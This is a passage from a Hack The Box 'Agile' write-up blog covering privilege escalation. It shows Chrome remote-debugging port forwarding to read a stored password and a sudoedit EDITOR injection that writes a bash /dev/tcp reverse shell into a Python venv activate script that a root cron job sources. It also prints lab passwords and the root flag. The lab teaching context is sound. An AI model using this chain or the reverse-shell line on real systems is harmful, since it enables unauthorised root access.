</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Last login: Wed Mar  8 15:25:35 2023 from 10.10.14.47
</span></span><span style="display:flex;"><span>corum@agile:~$
</span></span></code></pre></div><p>Doing my normal enumeration and nothing stands out. We should go back and look at the app as we saw before that multiple users are involved with it. We remember the test app we saw in <code>sites-enabled</code> running on port 5555</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>server {
</span></span><span style="display:flex;"><span>    listen 127.0.0.1:80;
</span></span><span style="display:flex;"><span>    server_name test.superpass.htb;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    location /static {
</span></span><span style="display:flex;"><span>        alias /app/app-testing/superpass/static;
</span></span><span style="display:flex;"><span>        expires 365d;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    location / {
</span></span><span style="display:flex;"><span>        include uwsgi_params;
</span></span><span style="display:flex;"><span>        proxy_pass http://127.0.0.1:5555;
</span></span><span style="display:flex;"><span>        proxy_set_header Host $host;
</span></span><span style="display:flex;"><span>        proxy_set_header X-Real-IP $remote_addr;
</span></span><span style="display:flex;"><span>        proxy_set_header X-Forwarded-Protocol $scheme;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So is this site running? Let&rsquo;s look at running processes to see if we can see anything</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ ps -ef --forest
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt; 
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>root       22085    1009  0 15:52 ?        00:00:00  \_ /usr/sbin/CRON -f -P
</span></span><span style="display:flex;"><span>runner     22088   22085  0 15:52 ?        00:00:00      \_ /bin/sh -c /app/test_and_update.sh
</span></span><span style="display:flex;"><span>runner     22089   22088  0 15:52 ?        00:00:00          \_ /bin/bash /app/test_and_update.sh
</span></span><span style="display:flex;"><span>runner     22096   22089  0 15:52 ?        00:00:00              \_ /app/venv/bin/python3 /app/venv/bin/pytest -x
</span></span><span style="display:flex;"><span>runner     22097   22096  0 15:52 ?        00:00:00                  \_ chromedriver --port=38969
</span></span><span style="display:flex;"><span>runner     22103   22097  0 15:52 ?        00:00:00                      \_ /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-backgr
</span></span><span style="display:flex;"><span>runner     22107   22103  0 15:52 ?        00:00:00                          \_ cat
</span></span><span style="display:flex;"><span>runner     22108   22103  0 15:52 ?        00:00:00                          \_ cat
</span></span><span style="display:flex;"><span>runner     22115   22103  0 15:52 ?        00:00:00                          \_ /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --enable-logging --head
</span></span><span style="display:flex;"><span>runner     22137   22115  0 15:52 ?        00:00:00                          |   \_ /opt/google/chrome/chrome --type=gpu-process --enable-logging --headless --log-
</span></span><span style="display:flex;"><span>runner     22116   22103  0 15:52 ?        00:00:00                          \_ /opt/google/chrome/chrome --type=zygote --enable-logging --headless --log-level=0 -
</span></span><span style="display:flex;"><span>runner     22118   22116  0 15:52 ?        00:00:00                          |   \_ /opt/google/chrome/chrome --type=zygote --enable-logging --headless --log-level
</span></span><span style="display:flex;"><span>runner     22168   22118  0 15:52 ?        00:00:01                          |       \_ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid
</span></span><span style="display:flex;"><span>runner     22140   22103  0 15:52 ?        00:00:00                          \_ /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkSe
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
</span></span></code></pre></div><p>Looks like there is a cronjob that is running the <code>/app/test_and_update.sh</code> script. Let&rsquo;s go to the <code>app</code> directory, and take a look at this script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ cat test_and_update.sh
</span></span><span style="display:flex;"><span>#!/bin/bash
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># update prod with latest from testing constantly assuming tests are passing
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>echo &#34;Starting test_and_update&#34;
</span></span><span style="display:flex;"><span>date
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># <span style="color:#66d9ef">if</span> already running, exit
</span></span><span style="display:flex;"><span>ps auxww | grep -v &#34;grep&#34; | grep -q &#34;pytest&#34; &amp;&amp; exit
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>echo &#34;Not already running. Starting...&#34;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># start in dev folder
</span></span><span style="display:flex;"><span>cd /app/app-testing
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># system-wide source doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t seem to happen in cron jobs
</span></span><span style="display:flex;"><span>source /app/venv/bin/activate
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># run tests, exit <span style="color:#66d9ef">if</span> failure
</span></span><span style="display:flex;"><span>pytest -x 2&gt;&amp;1 &gt;/dev/null || exit
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># tests good, update prod <span style="color:#f92672">(</span>flask debug mode will load it instantly<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>cp -r superpass /app/app/
</span></span><span style="display:flex;"><span>echo &#34;Complete!&#34;
</span></span></code></pre></div><p>It says that it starts in <code>/app/app-testing</code>. We go to the <code>/app/app-testing/</code> folder and drill down until we find a file called <code>test_site_interactively.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>corum@agile:/app/app-testing/tests/functional$ cat test_site_interactively.py
</span></span><span style="display:flex;"><span>import os
</span></span><span style="display:flex;"><span>import pytest
</span></span><span style="display:flex;"><span>import time
</span></span><span style="display:flex;"><span>from selenium import webdriver
</span></span><span style="display:flex;"><span>from selenium.webdriver.chrome.options import Options
</span></span><span style="display:flex;"><span>from selenium.webdriver.common.by import By
</span></span><span style="display:flex;"><span>from selenium.webdriver.support.ui import WebDriverWait
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>with open(&#39;/app/app-testing/tests/functional/creds.txt&#39;, &#39;r&#39;) as f:
</span></span><span style="display:flex;"><span>    username, password = f.read().strip().split(&#39;:&#39;)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>@pytest.fixture(scope=&#34;session&#34;)
</span></span><span style="display:flex;"><span>def driver():
</span></span><span style="display:flex;"><span>    options = Options()
</span></span><span style="display:flex;"><span>    #options.add_argument(&#34;--no-sandbox&#34;)
</span></span><span style="display:flex;"><span>    options.add_argument(&#34;--window-size=1420,1080&#34;)
</span></span><span style="display:flex;"><span>    options.add_argument(&#34;--headless&#34;)
</span></span><span style="display:flex;"><span>    options.add_argument(&#34;--remote-debugging-port=41829&#34;)
</span></span><span style="display:flex;"><span>    options.add_argument(&#39;--disable-gpu&#39;)
</span></span><span style="display:flex;"><span>    options.add_argument(&#39;--crash-dumps-dir=/tmp&#39;)
</span></span><span style="display:flex;"><span>    driver = webdriver.Chrome(options=options)
</span></span><span style="display:flex;"><span>    yield driver
</span></span><span style="display:flex;"><span>    driver.close()
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
</span></span></code></pre></div><p>We see that it is running a <code>--remote-debugging-port</code> on 41829. Let&rsquo;s set up port-forwarding to access this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ssh -L 41829:127.0.0.1:41829 corum@10.10.11.203
</span></span></code></pre></div><p>In order to access this site, you have to use Chromium hence the <code>driver = webdriveer.Chrome...</code> above. We have to do some set-up first. In the Chromium browser, we need to add the port to <code>Discover network targets</code>
<img src="/images/Agile/chromium.png" alt="Chromium"></p>
<p>We have to do this because it is running a headless Chrome browser which means that there is no GUI to interact with directly. Doing the set-up in <code>chrome://inspect#devices</code> allows us to see and interact with the debugging interface. Now if we click the <code>inspect</code> button, we can view the website
<img src="/images/Agile/inspect.png" alt="Inspect"></p>
<p>We can now interact with it through a GUI
<img src="/images/Agile/test.png" alt="Test"></p>
<p>And we find the password for the <code>edwards</code> user!
<img src="/images/Agile/edwards.png" alt="Edwards"></p>
<p>If we drill down into the HTML, we can copy the password which is <code>d07867c6267dcb5df0af</code>. We now can successfully SSH into the box as the <code>edwards</code> user. If we check <code>sudo</code> permissions, we see that we can run some commands</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>edwards@agile:~$ sudo -l
</span></span><span style="display:flex;"><span>[sudo] password for edwards:
</span></span><span style="display:flex;"><span>Matching Defaults entries for edwards on agile:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>User edwards may run the following commands on agile:
</span></span><span style="display:flex;"><span>    (dev_admin : dev_admin) sudoedit /app/config_test.json
</span></span><span style="display:flex;"><span>    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
</span></span></code></pre></div><p>Running <code>sudoedit</code> as <code>dev_admin</code> on <code>creds.txt</code> shows us was looks like more credentials for <code>edwards</code>?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;POPS UP IN NANO&gt;
</span></span><span style="display:flex;"><span>edwards:1d7ffjwrx#$d6qn!9nndqgde4
</span></span></code></pre></div><p>If we check the <code>sudo</code> version and Google it, we find that the version is vulnerable paired with <code>sudoedit</code>. However, when trying the exploit as shown, it doesn&rsquo;t work. This may be because we can only view files that are owned by <code>dev_admin</code>. So we need to find all files that <code>dev_admin</code> can view</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>edwards@agile:~$ find / -type f -user dev_admin 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/app/app-testing/tests/functional/creds.txt
</span></span><span style="display:flex;"><span>/app/config_test.json
</span></span><span style="display:flex;"><span>/app/config_prod.json
</span></span></code></pre></div><p>Nothing new here. How about the group <code>dev_admin</code>?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>edwards@agile:~$ find / -type f -group dev_admin 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/app/venv/bin/activate
</span></span><span style="display:flex;"><span>/app/venv/bin/Activate.ps1
</span></span><span style="display:flex;"><span>/app/venv/bin/activate.fish
</span></span><span style="display:flex;"><span>/app/venv/bin/activate.csh
</span></span></code></pre></div><p>The <code>/app/venv/bin/activate</code> file is how you activate the python virtual environment. To connect the last piece of this, you&rsquo;ll have to either remember, or go all the way back through your notes to figure out that the <code>test_and_update.sh</code> script in the <code>/app</code> folder is owned by <code>root</code>. Meaning that we can probably edit <code>/app/venv/bin/activate</code> to include our own malicious code</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ EDITOR<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;vim -- /app/venv/bin/activate&#39;</span> sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;VIM POPS UP&gt;
</span></span><span style="display:flex;"><span># This file must be used with <span style="color:#e6db74">&#34;source bin/activate&#34;</span> *from bash*
</span></span><span style="display:flex;"><span># you cannot run it directly
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>bash -i &gt;&amp; /dev/tcp/10.10.14.51/9999 0&gt;&amp;1
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>deactivate () {
</span></span><span style="display:flex;"><span>    # reset old environment variables
</span></span><span style="display:flex;"><span>    if [ -n &#34;${_OLD_VIRTUAL_PATH:-}&#34; ] ; then
</span></span><span style="display:flex;"><span>        PATH=&#34;${_OLD_VIRTUAL_PATH:-}&#34;
</span></span><span style="display:flex;"><span>        export PATH
</span></span><span style="display:flex;"><span>        unset _OLD_VIRTUAL_PATH
</span></span><span style="display:flex;"><span>    fi
</span></span><span style="display:flex;"><span>    if [ -n &#34;${_OLD_VIRTUAL_PYTHONHOME:-}&#34; ] ; then
</span></span><span style="display:flex;"><span>        PYTHONHOME=&#34;${_OLD_VIRTUAL_PYTHONHOME:-}&#34;
</span></span><span style="display:flex;"><span>        export PYTHONHOME
</span></span><span style="display:flex;"><span>        unset _OLD_VIRTUAL_PYTHONHOME
</span></span><span style="display:flex;"><span>    fi
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt; 
</span></span></code></pre></div><p>Set up our <code>nc</code> listener before we save it. Let&rsquo;s check to see if we actually edited it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>edwards@agile:/app$ cat venv/bin/activate
</span></span><span style="display:flex;"><span>#This file must be used with <span style="color:#e6db74">&#34;source bin/activate&#34;</span> *from bash*
</span></span><span style="display:flex;"><span># you cannot run it directly
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>bash -i &gt;&amp; /dev/tcp/10.10.14.51/9999 0&gt;&amp;1
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>deactivate () {
</span></span><span style="display:flex;"><span>    # reset old environment variables
</span></span><span style="display:flex;"><span>    if [ -n &#34;${_OLD_VIRTUAL_PATH:-}&#34; ] ; then
</span></span><span style="display:flex;"><span>        PATH=&#34;${_OLD_VIRTUAL_PATH:-}&#34;
</span></span><span style="display:flex;"><span>        export PATH
</span></span><span style="display:flex;"><span>        unset _OLD_VIRTUAL_PATH
</span></span><span style="display:flex;"><span> &lt;SNIP&gt;
</span></span></code></pre></div><p>Now we either just wait or log out and log back in to get the call back. After a short while we get a shell as root!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nlvp <span style="color:#ae81ff">9999</span>
</span></span><span style="display:flex;"><span>listening on [any] 9999 ...
</span></span><span style="display:flex;"><span>connect to [10.10.14.51] from (UNKNOWN) [10.10.11.203] 45110
</span></span><span style="display:flex;"><span>bash: cannot set terminal process group (24650): Inappropriate ioctl for device
</span></span><span style="display:flex;"><span>bash: no job control in this shell
</span></span><span style="display:flex;"><span>bash: connect: Connection refused
</span></span><span style="display:flex;"><span>bash: /dev/tcp/10.10.14.51/9999: Connection refused
</span></span><span style="display:flex;"><span>root@agile:~# whoami
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>root
</span></span><span style="display:flex;"><span>root@agile:~#
</span></span></code></pre></div><p>Now let&rsquo;s finally grab the root flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@agile:~# cat root.txt
</span></span><span style="display:flex;"><span>cat root.txt
</span></span><span style="display:flex;"><span>16e8a46e152abf74d9a629b709dc1d25
</span></span></code></pre></div>
</content>
<p>
  
  <a href="https://jordangalida.github.io/blog/htb/">#HTB</a>
  
  <a href="https://jordangalida.github.io/blog/pentesting/">#Pentesting</a>
  
</p>

  </main>
  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo  Bear</a>
</footer>

    
</body>

</html>
